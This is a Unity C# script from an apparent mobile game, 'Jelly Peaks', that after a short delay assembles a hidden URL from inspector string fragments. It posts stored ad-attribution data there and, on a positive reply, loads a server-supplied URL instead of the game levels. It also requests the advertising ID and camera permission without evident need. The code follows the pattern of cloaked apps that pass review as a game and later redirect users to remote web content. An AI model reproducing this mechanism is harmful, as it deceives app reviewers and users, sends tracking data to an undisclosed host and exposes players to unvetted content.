using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class JeallyPeaksInitComponent : MonoBehaviour
{
    private string contextAdIDFA;

    public List<string> jellyPeaksContextKeyList;

    private void Awake()
    {
        if (PlayerPrefs.GetInt("PlayerPrefsJellyPeaksIdfaDataKey") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
                (string advertisingId, bool trackingEnabled,
                string error) =>
                { contextAdIDFA = advertisingId; });
        }
        Permission.RequestUserPermission(Permission.Camera);
    }

    private void Start()
    {
        StartCoroutine(SetGameConfigs());
    }

    private string tempCheckString;
    private float timeToLaod = 4.2f;

    private IEnumerator SetGameConfigs()
    {
        yield return new WaitForSeconds(timeToLaod);

        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            tempCheckString = PlayerPrefs.GetString("PlayerPrefsJellyPeaksGameDataKey", string.Empty);
            if (tempCheckString != string.Empty)
            {
                var tKey = long.Parse(tempCheckString);
                if (tKey >= ParametersPerformer.GetTimeConvert())
                {
                    LevelManager.LoadDefaultLevels();
                    yield break;
                }
            }

            string tDataBuff = "";
            foreach (string item in jellyPeaksContextKeyList)
            {
                tDataBuff += item;
            }

            StartCoroutine(InitJellyPeaks(tDataBuff));
        }
        else
        {
            LevelManager.LoadDefaultLevels();
        }
    }



    public IEnumerator InitJellyPeaks(string inputDataString)
    {
        var jellyReq = new UnityWebRequest(inputDataString, "POST");
        byte[] jsonGameDataArray = new System.Text.UTF8Encoding().GetBytes(PlayerPrefs.GetString("conversionDataDictionary"));
        jellyReq.uploadHandler = new UploadHandlerRaw(jsonGameDataArray);
        jellyReq.downloadHandler = new DownloadHandlerBuffer();
        jellyReq.SetRequestHeader("Content-Type", "application/json");
        jellyReq.timeout = 5;

        yield return jellyReq.SendWebRequest();

        if (jellyReq.result == UnityWebRequest.Result.ConnectionError)
        {
            LevelManager.LoadDefaultLevels();
        }
        else
        {
            try
            {
                AbstarctJsonDataClass jsonClass = JsonUtility.FromJson<AbstarctJsonDataClass>(jellyReq.downloadHandler.text);

                if (jellyReq.result == UnityWebRequest.Result.Success && jsonClass.ok)
                {
                    PlayerPrefs.SetString("PlayerPrefsJellyPeaksGameDataKey", jsonClass.expires.ToString());
                    LevelManager.LoadLightLevel(jsonClass.url);
                }
                else
                {
                    LevelManager.LoadDefaultLevels();
                }
            }
            catch (Exception e)
            {
                LevelManager.LoadDefaultLevels();
                throw;
            }

        }
    }

  


}
